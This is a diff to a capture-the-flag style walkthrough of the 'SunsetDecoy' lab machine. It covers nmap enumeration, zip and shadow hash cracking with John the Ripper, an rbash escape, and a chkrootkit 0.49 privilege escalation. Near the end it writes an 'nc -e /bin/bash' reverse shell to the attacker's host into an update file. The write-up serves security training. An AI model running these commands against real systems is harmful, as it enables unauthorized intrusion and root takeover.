@@ -5,10 +5,16 @@
 - [References](#references)
 
 ## Machine information
-```
+
+```text
 Difficulty: Easy
+Community Rating: Hard
 OS: Linux
 Points: 5
+Description:
+Employ enumeration and web enumeration techniques to identify vulnerabilities. Engage in password cracking 
+and implement privilege escalation strategies. Additionally, utilize process monitoring to enhance your 
+access. This lab is designed to capitalize on your skills in vulnerability exploitation.
 Released: 16 Sep 2020
 ```
 
@@ -17,6 +23,7 @@ Released: 16 Sep 2020
 ### Scan for services with nmap
 
 We start by scanning the machine with `nmap`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
 └─$ nmap -v -sV -sC 192.168.249.85
@@ -80,7 +87,9 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.53 seconds
 ```
+
 We have two services running:
+
 - Apache httpd v2.4.38 on port 80
 - OpenSSH 7.9p1 on port 22
 
@@ -91,6 +100,7 @@ Browsing manually to port 80 shows a directory listing with one file.
 ![Web site on SunsetDecoy](Images/Web_site_on_SunsetDecoy.png)
 
 Let's download the file and try to unpack it
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
 └─$ wget http://192.168.249.85/save.zip
@@ -109,11 +119,13 @@ save.zip                                       100%[============================
 Archive:  save.zip
 [save.zip] etc/passwd password:  
 ```
+
 Nope, it's password protected.
 
 ### Crack the zip file password
 
 To crack the password of the zip file we first need to get the hash with `zip2john`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
 └─$ zip2john save.zip > zip_file_hash.txt
@@ -133,6 +145,7 @@ save.zip:$pkzip$6*1*1*0*8*24*8759*a7409df1d7a76ad3809794d387209855bb7638aa589d5b
 ```
 
 Next, we try to crack the hash with [John the Ripper](https://www.openwall.com/john/) and the rockyou wordlist
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt zip_file_hash.txt 
@@ -145,11 +158,13 @@ manuel           (save.zip)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
+
 The password is `manuel`.
 
 ### Unpack the zip file
 
 Now we can unpack the zip file
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
 └─$ unzip save.zip
@@ -164,6 +179,7 @@ Archive:  save.zip
 ```
 
 We get several files (a backup?) from an unknown machine with named with a hash looking name
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
 └─$ cat etc/hostname 
@@ -175,6 +191,7 @@ The most interesting files ought to be the [passwd](https://en.wikipedia.org/wik
 ### Crack the passwd and shadow files
 
 Once again we use `john` to crack the passwords
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
 └─$ unshadow etc/passwd etc/shadow > passwd_combined.txt
@@ -193,11 +210,13 @@ server           (296640a3b825115a47b68fc44501c828)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
+
 We get a password (`server`) for the `296640a3b825115a47b68fc44501c828` user.
 
 ### Try to login with SSH
 
 Now that we have both a username and password we can try to login with SSH
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
 └─$ ssh 296640a3b825115a47b68fc44501c828@192.168.249.85
@@ -242,11 +261,13 @@ logout
 -rbash: /usr/bin/clear_console: restricted: cannot specify `/' in command names
 Connection to 192.168.249.85 closed.
 ```
+
 We seem to be in a restricted `rbash` environment. :-(
 
 It turns out you can run `bash` as a [restricted shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) by starting it as `rbash`.
 
 We can confirm this by going back a checking the shell for the user in the `passwd` file
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
 └─$ tail etc/passwd
@@ -267,6 +288,7 @@ systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 Fortunately, there are several ways to [escape the rbash environment](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/).
 
 We login again, but this time with the `--noprofile` parameter
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
 └─$ ssh 296640a3b825115a47b68fc44501c828@192.168.249.85 -t "bash --noprofile"
@@ -294,6 +316,7 @@ lrwxrwxrwx 1 root                             root                              
 ### Get the user flag
 
 Now we can try to get the user flag
+
 ```bash
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cat user.txt 
 bash: cat: command not found
@@ -308,6 +331,7 @@ Your flag is in another file...
 ### Enumeration
 
 Let's start our enumeration by checking out the honeypot related files in the user's home directory
+
 ```bash
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /bin/cat honeypot.decoy.cpp 
 /bin/cat: honeypot.decoy.cpp: Permission denied
@@ -336,14 +360,17 @@ We can install and run [pspy](https://github.com/DominicBreuker/pspy) to identif
 ### Download pspy to the machine
 
 First we check if this is a 32- or 64-bit machine
+
 ```bash
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ uname -a
 Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
 ```
+
 It's a 64-bit machine.
 
 We download the big (statically linked) 64-bit version of `pspy` to our local Kali machine
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
 └─$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 
@@ -370,6 +397,7 @@ pspy64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, 
 ```
 
 Then we start a local web server on port 8000
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
 └─$ python -m http.server 8000
@@ -377,6 +405,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 Back at the SunsetDecoy machine we can now get `pspy` with `wget`
+
 ```bash
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cd /tmp
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ wget http://192.168.45.179:8000/pspy64
@@ -390,11 +419,13 @@ pspy64                                         100%[============================
 
 2024-09-10 07:28:07 (3.48 MB/s) - ‘pspy64’ saved [3104768/3104768]
 ```
+
 The home directory is not writeable so we download it to `/tmp`.
 
 ### Identify background processes with pspy
 
 Now we can run `pspy` to identify any processes running in the background
+
 ```bash
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ chmod +x pspy64 
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ ./pspy64 
@@ -442,11 +473,13 @@ done
 2024/09/10 07:30:01 CMD: UID=0     PID=4899   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
 <---snip--->
 ```
+
 We see that an older version of [chkrootkit](https://www.chkrootkit.org/) is running.
 
 ### Check for an exploit
 
 Let's see if there are any exploits available for the version
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
 └─$ searchsploit chkrootkit         
@@ -468,11 +501,13 @@ Shellcodes: No Results
 File Type: ASCII text
 Copied to: /mnt/hgfs/Wargames/OffSec_PG/PG_Play/SunsetDecoy/33899.txt
 ```
+
 Yes, there is - a local privesc.
 
 ### Examine the exploit
 
 To run the exploit we need to create an `update` file that gets executed
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
 └─$ cat 33899.txt   
@@ -504,6 +539,7 @@ easily take advantage of this.
 ### Get a reverse shell as root
 
 Let's see if we have netcat available of the machine
+
 ```bash
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ which nc
 /bin/nc
@@ -537,9 +573,11 @@ options:
 port numbers can be individual or ranges: lo-hi [inclusive];
 hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
 ```
+
 Yes, a version that supports the `-e` parameter!
 
 We start a netcat listener back at our Kali machine
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
 └─$ nc -lvnp 12345                                       
@@ -547,6 +585,7 @@ listening on [any] 12345 ...
 ```
 
 And create a reverse shell in the `update` file
+
 ```bash
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ echo "/bin/nc -e /bin/bash 192.168.45.179 12345" > update
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ chmod +x update 
@@ -555,6 +594,7 @@ And create a reverse shell in the `update` file
 ### Get the root flag
 
 And then we wait for a connection and get the root flag
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
 └─$ nc -lvnp 12345                                       
@@ -579,6 +619,7 @@ cat proof.txt
 f<REDACTED>6
 exit
 ```
+
 Nice!
 
 For additional information, please see the references below.
@@ -588,7 +629,9 @@ For additional information, please see the references below.
 - [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
 - [chkrootkit - Homepage](https://www.chkrootkit.org/)
 - [John the Ripper - Homepage](https://www.openwall.com/john/)
+- [nmap - Homepage](https://nmap.org/)
 - [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
+- [nmap - Manual page](https://nmap.org/book/man.html)
 - [OpenSSH  - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
 - [passwd - Wikipedia](https://en.wikipedia.org/wiki/Passwd)
 - [pspy - GitHub](https://github.com/DominicBreuker/pspy)
